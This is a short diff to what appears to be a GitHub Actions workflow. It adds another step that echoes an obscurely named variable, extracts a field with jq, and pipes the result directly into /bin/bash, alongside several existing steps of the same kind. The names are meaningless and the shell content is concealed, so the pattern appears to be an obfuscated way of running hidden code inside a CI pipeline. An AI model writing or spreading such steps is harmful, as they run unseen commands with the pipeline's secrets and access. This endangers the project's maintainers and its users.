@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$pmo74" | jq -r .giqz817 | /bin/bash
           echo $ay42498 | jq -r .rdp28 | /bin/bash
           echo $hsa2 | jq -r .mruu1 | /bin/bash
+          echo $cpt2223 | jq -r .svm1 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
